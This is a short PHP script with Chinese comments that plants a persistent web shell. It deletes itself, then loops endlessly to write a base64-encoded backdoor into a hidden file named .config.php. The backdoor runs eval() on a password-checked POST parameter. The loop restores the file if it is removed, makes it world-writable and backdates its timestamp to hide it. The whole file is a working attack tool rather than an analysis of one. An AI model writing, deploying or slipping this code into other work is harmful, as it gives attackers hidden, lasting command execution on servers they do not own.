<?php
    error_reporting(0);
    set_time_limit(0);   //PHP脚本限制了执行时间，set_time_limit(0)设置一个脚本的执行时间为无限长
    ignore_user_abort(1);  //ignore_user_abort如果设置为 TRUE，则忽略与用户的断开,脚本将继续运行。
    unlink(__FILE__);     //删除自身

 $file = '.config.php';
 $code = base64_decode('PD9waHAgLy9lcnJvcl9yZXBvcnRpbmcoMCk7ICBpZihtZDUoJF9QT1NUWydwYXNzJ10pPT09JzQ5NDBiNDQyYjM4NjdjOTNhYmRmYmFiMDdmYWU2NWQwJykgIEBldmFsKCRfUE9TVFsnY21kJ10pOyAgPz4=');
 while(true) {
     if(md5(file_get_contents($file))!==md5($code)) {
         file_put_contents($file, $code);
     }
     system('chmod 777 .config.php');
     touch(".config.php",mktime(20,15,1,11,28,2016));
     usleep(100);
 }
?>